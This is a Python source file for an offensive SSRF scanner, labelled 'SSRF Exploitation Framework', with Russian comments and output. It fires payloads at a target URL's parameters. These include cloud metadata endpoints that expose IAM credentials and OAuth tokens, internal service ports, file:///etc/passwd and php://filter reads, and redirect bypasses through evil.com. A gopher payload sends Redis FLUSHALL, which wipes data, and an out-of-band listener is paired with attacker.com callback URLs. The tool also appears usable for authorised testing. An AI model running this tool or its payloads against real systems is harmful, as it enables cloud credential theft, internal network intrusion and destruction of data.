import requests
import urllib.parse
import socket
import threading
import time
import json
import argparse
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style, Back
import requests.packages.urllib3

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

class ProSSRFScanner:
    def __init__(self, target, threads=20, timeout=12, output=None, oob_port=8080):
        self.target = target.rstrip('?')
        self.threads = threads
        self.timeout = timeout
        self.output = output
        self.oob_port = oob_port
        self.session = requests.Session()
        self.session.verify = False
        
        
        self.payloads = {
            'local': [
                'http://127.0.0.1', 'http://localhost', 'http://127.0.0.1/', 
                'http://[::1]', 'http://0.0.0.0', 'http://0', 'http://127.1',
                'http://2130706433', 'http://0x7F000001', 'http://0177.0.0.1'
            ],
            'cloud': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/metadata/identity/oauth2/token',
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            ],
            'services': [
                'http://127.0.0.1:22', 'http://127.0.0.1:6379', 'http://127.0.0.1:3306',
                'http://127.0.0.1:5432', 'http://127.0.0.1:27017', 'http://127.0.0.1:11211',
                'http://172.17.0.1:80', 'http://10.0.0.1', 'http://192.168.0.1'
            ],
            'bypass': [
                'http://localhost@evil.com', 'http://evil.com#@localhost',
                'http://evil.com/?url=http://127.0.0.1', 'http://127.0.0.1#@evil.com',
                'http://www.google.com../127.0.0.1', 'file:///etc/passwd',
                'file:///c:/windows/win.ini', 'php://filter/read=convert.base64-encode/resource=index.php'
            ],
            'oob': [],
            'gopher': [
                'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0aQUIT%0d%0a',
                'gopher://127.0.0.1:6379/_INFO'
            ]
        }
        
        self.indicators = {
            'aws': ['ami-', 'instance-id', 'dev/', 'security-credentials'],
            'gcp': ['project', 'instance', 'computeMetadata'],
            'redis': ['redis_version', '+PONG', 'ERR ', 'connected'],
            'ssh': ['ssh-', 'openssh', 'remote protocol'],
            'mysql': ['mysql', 'handshake', 'native_password'],
            'postgres': ['postgres', 'server_version'],
            'memcached': ['version', 'STAT pid'],
            'cloud': ['metadata', '169.254.169.254', 'token']
        }
        
        self.results = []
        self.oob_hits = []
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def generate_oob_payloads(self):
        """Генерация OOB payload'ов с твоим IP"""
        local_ip = self.get_local_ip()
        self.payloads['oob'] = [
            f'http://{local_ip}:{self.oob_port}/ssrf',
            f'http://{local_ip}.attacker.com/',
            f'dns://{local_ip}.attacker.com'
        ]
    
    def start_oob_listener(self):
        """OOB HTTP сервер для перехвата"""
        def listener():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', self.oob_port))
                s.listen(10)
                print(f"{Fore.GREEN}[+] OOB listener: http://{self.get_local_ip()}:{self.oob_port}{Style.RESET_ALL}")
                
                while True:
                    try:
                        conn, addr = s.accept()
                        data = conn.recv(4096).decode('utf-8', errors='ignore')
                        hit = f"{addr[0]}:{addr[1]} -> {data[:200]}"
                        self.oob_hits.append(hit)
                        print(f"{Fore.RED + Style.BRIGHT}[OOB HIT!] {hit}{Style.RESET_ALL}")
                        conn.close()
                    except:
                        break
        
        thread = threading.Thread(target=listener, daemon=True)
        thread.start()
    
    def extract_params(self, url):
        """Извлечение и анализ параметров"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        
        ssrf_keywords = ['url', 'uri', 'path', 'dest', 'redirect', 'next', 'data', 
                        'ref', 'site', 'callback', 'image', 'img', 'load', 'fetch',
                        'host', 'proxy', 'target', 'endpoint', 'source']
        
        ssrf_params = [p for p in params if any(kw in p.lower() for kw in ssrf_keywords)]
        return ssrf_params if ssrf_params else list(params.keys())
    
    def test_param(self, base_url, param, payload):
        """Тестирование одного параметра"""
        try:
            q = urllib.parse.parse_qs(urllib.parse.urlparse(base_url).query)
            q[param] = payload
            test_url = f"{base_url.split('?')[0]}?{urllib.parse.urlencode(q, doseq=True)}"
            
            headers = {'User-Agent': 'Mozilla/5.0 (SSRF-Pro/2.0)'}
            if '169.254' in payload:
                headers['Metadata'] = 'true'
            
            start = time.time()
            r = self.session.get(test_url, headers=headers, timeout=self.timeout, 
                               allow_redirects=False)
            elapsed = time.time() - start
            
            result = {
                'param': param,
                'payload': payload,
                'status': r.status_code,
                'time': elapsed,
                'length': len(r.text),
                'confirmed': False,
                'evidence': '',
                'snippet': r.text[:300]
            }
            
            
            body_lower = r.text.lower()
            for vuln_type, signs in self.indicators.items():
                for sign in signs:
                    if sign in body_lower:
                        result['confirmed'] = True
                        result['evidence'] = f"{vuln_type}: {sign}"
                        break
                if result['confirmed']:
                    break
            
            
            if not result['confirmed']:
                if r.status_code >= 500 or elapsed > 8 or len(r.text) < 100:
                    result['confirmed'] = 'blind'
                    result['evidence'] = f"anomaly: {r.status_code}/{elapsed:.1f}s/{len(r.text)}b"
            
            return result
            
        except Exception:
            return {'param': param, 'payload': payload, 'error': 'timeout/error'}
    
    def run_attack(self):
        """Полный цикл атаки"""
        print(f"{Fore.CYAN}{'='*80}")
        print(f"{Fore.GREEN + Style.BRIGHT}🚀 SSRF EXPLOITATION FRAMEWORK v2.0 🚀{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Target: {self.target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}")
        
        
        self.generate_oob_payloads()
        self.start_oob_listener()
        time.sleep(1)
        
        
        params = self.extract_params(self.target)
        print(f"{Fore.CYAN}[*] Найдено параметров: {len(params)} -> {', '.join(params[:5])}{'...' if len(params)>5 else ''}{Style.RESET_ALL}")
        
        all_payloads = []
        for category, ploads in self.payloads.items():
            for p in ploads:
                for param in params:
                    all_payloads.append((param, p))
        
        print(f"{Fore.CYAN}[*] Тестирование {len(all_payloads)} векторов... ({self.threads} потоков){Style.RESET_ALL}")
        
        confirmed = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_param, self.target, param, payload) 
                      for param, payload in all_payloads[:200]]  # Лимит для скорости
            
            for future in as_completed(futures):
                result = future.result()
                if result.get('confirmed'):
                    confirmed.append(result)
                    self.print_confirmed(result)
        
        self.generate_pro_report(confirmed)
    
    def print_confirmed(self, result):
        sev = Fore.RED + Style.BRIGHT if result['evidence'] and 'cloud' in result['evidence'].lower() else Fore.MAGENTA + Style.BRIGHT
        print(f"\n{sev}{'='*60}{Style.RESET_ALL}")
        print(f"{sev}[!] SSRF CONFIRMED -> {result['param']} = {result['payload'][:50]}{Style.RESET_ALL}")
        print(f"    {Fore.YELLOW}Status: {result['status']} | Time: {result['time']:.2f}s | Len: {result['length']}{Style.RESET_ALL}")
        print(f"    {Fore.GREEN}Evidence: {result['evidence']}{Style.RESET_ALL}")
    
    def generate_pro_report(self, confirmed):
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.WHITE + Style.BRIGHT}📋 ИТОГОВЫЙ ОТЧЕТ{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}")
        
        if confirmed:
            print(f"{Fore.RED + Style.BRIGHT}[CRITICAL!] SSRF ПОДТВЕРЖДЕНА ({len(confirmed)} векторов){Style.RESET_ALL}")
            
            impacts = []
            if any('cloud' in r['evidence'].lower() for r in confirmed):
                impacts.append("☁️  КРАЖА ОБЛАЧНЫХ ТОКЕНОВ")
            if any('redis' in r['evidence'].lower() for r in confirmed):
                impacts.append("🔥 RCE ЧЕРЕЗ REDIS")
            impacts.extend(["🌐 INTERNAL PIVOTING", "📁 FILE READ", "💥 SERVICE ENUM"])
            
            for impact in impacts:
                print(f"  {Fore.YELLOW + Style.BRIGHT}{impact}{Style.RESET_ALL}")
            
            
            if self.output:
                report = {
                    'target': self.target,
                    'confirmed': confirmed,
                    'oob_hits': self.oob_hits,
                    'time': time.strftime('%Y-%m-%d %H:%M:%S')
                }
                with open(self.output, 'w', encoding='utf-8') as f:
                    json.dump(report, f, ensure_ascii=False, indent=2)
                print(f"{Fore.GREEN}[+] Отчет сохранен: {self.output}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[✓] SSRF не обнаружена{Style.RESET_ALL}")


def run():
    '''Wrapper function for main.py integration'''
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Error: {e}")


def main():
    parser = argparse.ArgumentParser(description='🔥 Pro SSRF Exploitation Framework')
    parser.add_argument('target', help='URL с параметрами (?param=)')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Потоки')
    parser.add_argument('-T', '--timeout', type=int, default=12, help='Таймаут')
    parser.add_argument('-o', '--output', help='JSON отчет')
    parser.add_argument('--oob-port', type=int, default=8080, help='OOB порт')
    
    args = parser.parse_args()
    scanner = ProSSRFScanner(args.target, args.threads, args.timeout, args.output, args.oob_port)
    scanner.run_attack()
    
    print(f"\n{Fore.CYAN}{'='*80}")
    input("Нажмите Enter для выхода...")

if __name__ == "__main__":
    main()
